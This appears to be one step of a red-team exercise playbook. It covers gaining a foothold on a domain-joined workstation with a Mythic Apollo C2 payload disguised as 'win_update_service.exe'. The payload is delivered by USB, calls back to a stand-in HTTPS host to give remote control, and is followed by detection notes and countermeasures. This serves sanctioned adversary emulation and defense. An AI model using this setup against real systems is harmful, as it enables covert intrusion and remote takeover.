
# Step 0: Gain Initial Foothold

**Objective**: Simulate an insider threat by establishing an internal beacon on a trusted domain-joined workstation using a manually executed USB-delivered payload.

---

## Context

- Target system: `it-workstation02` (domain-joined, internal)
- Insider scenario: White Cell simulates an insider or rogue admin with physical access
- Payload type: Mythic Apollo agent
- Execution method: Manual execution by White Cell after USB insertion

---

## Execution

### 1. Generate Apollo Payload in Mythic

- **Payload Type**: Apollo  
- **Name**: `win_update_service.exe`  
- **C2 Profile**: HTTPS  
- **Callback Host**: `https://stage1.domain-sync[.]com`  
- **Callback Interval / Jitter**: `60s ± 30%`  
- **User-Agent**: `"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/114.0.0.0"`

### 2. Prepare USB for Delivery

- Place the payload on the USB under:
  ```
  \Updates\win_update_service.exe
  ```

### 3. White Cell Execution

- White Cell plugs USB into `it-workstation02`
- Manually executes the payload from:
  ```
  C:\Users\Public\win_update_service.exe
  ```

### 4. Beacon Callback to Mythic

- Mythic receives a new callback:
  ```
  Host: it-workstation02
  User: <ELCOOP\john.smith>
  Privileges: High
  PID: 2124
  Integrity: High
  ```

- Tag in Mythic:
  - `Initial Foothold`
  - `Insider Access - Workstation`

---

## Result

- Red Team has internal access as a privileged domain user.
- Mythic beacon is live, giving remote control of the workstation.
- Stage set for lateral movement, persistence, and impact operations.

---

## Detection Opportunities

| Vector | Description |
|--------|-------------|
| USB Insertion | Device control logs, Windows Event ID 20001 (if configured) |
| Unknown Executable | Execution from USB or `C:\Users\Public\` |
| C2 Traffic | New HTTPS connection to unknown domain/IP |

---

## Defensive Countermeasures

- Enforce USB restrictions or alert on insert
- Monitor for executable launches from unusual directories
- Use egress controls to limit outbound callbacks
